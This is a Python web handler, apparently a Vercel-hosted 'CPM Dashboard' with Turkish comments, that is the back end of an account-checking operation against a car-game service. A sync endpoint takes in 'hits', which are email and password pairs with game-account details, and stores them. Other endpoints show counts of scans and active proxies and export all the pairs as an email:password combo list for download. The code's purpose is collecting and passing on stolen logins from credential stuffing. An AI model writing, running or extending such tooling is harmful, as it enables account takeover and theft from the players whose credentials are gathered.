import os
import json
import time
from http.server import BaseHTTPRequestHandler

BASE_DIR = os.path.dirname(__file__)
HTML_FILE = os.path.join(os.path.dirname(BASE_DIR), "templates", "dashboard.html")
BUNDLE_FILE = os.path.join(BASE_DIR, "hits_data.json")
HITS_CACHE_FILE = "/tmp/hits_cache.json" if os.path.exists("/tmp") else os.path.join(BASE_DIR, "hits_cache.json")

CACHE = {
    "total_hits": 0,
    "total_accs": 0,
    "total_scans": 0,
    "total_vips": 1,
    "total_admins": 1,
    "active_proxies": 25,
    "recent_hits": []
}

def load_cache():
    global CACHE
    # 1. Proje içindeki kalıcı JSON'ı yükle
    if os.path.exists(BUNDLE_FILE):
        try:
            with open(BUNDLE_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                CACHE.update(data)
        except Exception:
            pass

    # 2. Çalışma anında gelen yeni hitleri (/tmp) üstüne ekle
    if os.path.exists(HITS_CACHE_FILE):
        try:
            with open(HITS_CACHE_FILE, "r", encoding="utf-8") as f:
                tmp_data = json.load(f)
                if "recent_hits" in tmp_data and isinstance(tmp_data["recent_hits"], list):
                    for th in tmp_data["recent_hits"]:
                        if not any(x.get("email") == th.get("email") for x in CACHE["recent_hits"]):
                            CACHE["recent_hits"].insert(0, th)
                if "total_hits" in tmp_data and tmp_data["total_hits"] > CACHE.get("total_hits", 0):
                    CACHE["total_hits"] = tmp_data["total_hits"]
                if "total_accs" in tmp_data:
                    CACHE["total_accs"] = max(CACHE["total_accs"], tmp_data["total_accs"])
        except Exception:
            pass

    CACHE["total_hits"] = max(CACHE.get("total_hits", 0), len(CACHE["recent_hits"]))

def save_cache():
    try:
        with open(HITS_CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(CACHE, f, ensure_ascii=False)
    except Exception:
        pass

load_cache()

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
        self.end_headers()

    def do_GET(self):
        load_cache()
        path = self.path.split("?")[0]

        # 1. Ana Sayfa (Web Dashboard Arayüzü)
        if path in ("/", "/index.html"):
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            
            if os.path.exists(HTML_FILE):
                with open(HTML_FILE, "r", encoding="utf-8") as f:
                    content = f.read()
                self.wfile.write(content.encode("utf-8"))
            else:
                self.wfile.write(b"<h1>CPM Dashboard</h1><p>Template not found.</p>")
            return

        # 2. Canlı Sağlık ve Ping Endpoint'i (/health veya /ping)
        elif path in ("/health", "/ping", "/api/health"):
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {
                "status": "healthy",
                "service": "CPM Vercel Web Dashboard & API",
                "active_proxies": CACHE.get("active_proxies", 25),
                "total_hits": CACHE.get("total_hits", len(CACHE["recent_hits"])),
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            self.wfile.write(json.dumps(data).encode("utf-8"))
            return

        # 3. İstatistik ve Tüm Hitler API'si (/api/stats veya /api/all_hits)
        elif path in ("/api/stats", "/api/all_hits"):
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            
            data = {
                "status": "success",
                "total_hits": CACHE.get("total_hits", len(CACHE["recent_hits"])),
                "total_accs": CACHE.get("total_accs", len(CACHE["recent_hits"])),
                "total_scans": CACHE.get("total_scans", 1),
                "total_vips": CACHE.get("total_vips", 1),
                "total_admins": CACHE.get("total_admins", 1),
                "active_proxies": CACHE.get("active_proxies", 25),
                "recent_hits": CACHE.get("recent_hits", [])
            }
            self.wfile.write(json.dumps(data).encode("utf-8"))
            return

        # 4. TXT İndirme Endpoint'i (/api/export/txt)
        elif path == "/api/export/txt":
            self.send_response(200)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.send_header("Content-Disposition", 'attachment; filename="cpm_tum_hitler.txt"')
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            lines = [f"{h.get('email')}:{h.get('password', '123456')}" for h in CACHE.get("recent_hits", [])]
            self.wfile.write("\n".join(lines).encode("utf-8"))
            return

        # 5. 404
        else:
            self.send_response(404)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Endpoint not found"}).encode("utf-8"))
            return

    def do_POST(self):
        path = self.path.split("?")[0]

        # Canlı Hit & İstatistik Senkronizasyonu (/api/hit_sync)
        if path == "/api/hit_sync":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            try:
                payload = json.loads(body.decode("utf-8"))
                
                # Yeni hit ekleme
                if "hits" in payload and isinstance(payload["hits"], list):
                    for h in payload["hits"]:
                        new_item = {
                            "email": h.get("email", "Gizli"),
                            "password": h.get("password", "******"),
                            "level": h.get("cpm_level", h.get("level", 0)),
                            "total_cars": h.get("cpm_total_cars", h.get("total_cars", 0)),
                            "unlocked_cars": h.get("cpm_unlocked_cars", h.get("unlocked_cars", 0)),
                            "created_at": h.get("checked_at", h.get("created_at", time.strftime("%Y-%m-%d %H:%M:%S")))
                        }
                        if not any(x.get("email") == new_item["email"] for x in CACHE["recent_hits"]):
                            CACHE["recent_hits"].insert(0, new_item)

                    CACHE["total_hits"] = max(CACHE.get("total_hits", 0), len(CACHE["recent_hits"]))

                # İstatistik güncelleme
                if "stats" in payload:
                    st = payload["stats"]
                    CACHE["total_accs"] = st.get("total_accs", CACHE["total_accs"])
                    CACHE["total_scans"] = st.get("total_scans", CACHE["total_scans"])
                    CACHE["active_proxies"] = st.get("active_proxies", CACHE["active_proxies"])
                    if "total_hits" in st and st["total_hits"] > CACHE.get("total_hits", 0):
                        CACHE["total_hits"] = st["total_hits"]

                save_cache()

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "synced", "total_hits": CACHE["total_hits"]}).encode("utf-8"))
                return
            except Exception as e:
                self.send_response(400)
                self.send_header("Content-type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode("utf-8"))
                return
        else:
            self.send_response(404)
            self.send_header("Content-type", "application/json")
            self.end_headers()
